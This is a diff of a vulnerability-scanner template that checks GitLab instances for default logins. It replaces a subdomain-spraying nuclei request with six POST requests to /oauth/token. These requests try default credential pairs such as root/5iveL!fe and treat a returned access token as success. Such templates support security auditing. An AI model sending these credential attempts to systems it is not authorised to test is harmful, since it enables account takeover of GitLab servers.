@@ -1,49 +1,72 @@
-id: gitlab-weak-login 2
+id: gitlab-weak-login
+
 info:
-  author: Suman_Kar
-  name: Gitlab Weak Login
+  name: Gitlab Default Login
+  author: Suman_Kar,dwisiswant0
   severity: high
-  tags: gitlab,default-login
-requests:
-- attack: sniper
-  matchers:
-  - status:
-    - 200
-    type: status
-  - part: header
-    type: word
-    words:
-    - application/json
-  - condition: and
-    part: body
-    type: word
-    words:
-    - '"access_token":'
-    - '"token_type":'
-    - '"refresh_token":'
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'POST /oauth/token HTTP/1.1
+  verified: true
+  description: Gitlab default login credentials were discovered.
+  reference:
+    - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
+    - https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
 
-    Host: {{Subdomains}}
+set:
+    hostname: request.url.host
+    hosturl: request.url
+rules:
+    r0:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"root","password":"5iveL!fe"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+    r1:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"root","password":"123456789"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+    r2:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"admin","password":"5iveL!fe"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+    r3:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"admin","password":"123456789"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+    r4:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"admin@local.host","password":"5iveL!fe"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+    r5:
+        request:
+            method: POST
+            path: /oauth/token
+            headers:
+                content-type: application/json
+            body: |
+                {"grant_type":"password","username":"admin@local.host","password":"123456789"}
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"access_token":') && response.body.bcontains(b'"token_type":') && response.body.bcontains(b'"refresh_token":')
+expression: r0() || r1() || r2() || r3() || r4() || r5()
 
-    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101
-    Firefox/79.0
-
-    Accept: application/json, text/plain, */*
-
-    Accept-Language: en-US,en;q=0.5
-
-    Referer: https://{{Subdomains}}
-
-    content-type: application/json
-
-    Connection: close
-
-
-    {"grant_type":"password","username":"admin","password":"12345"}
-
-    '
-  threads: 100
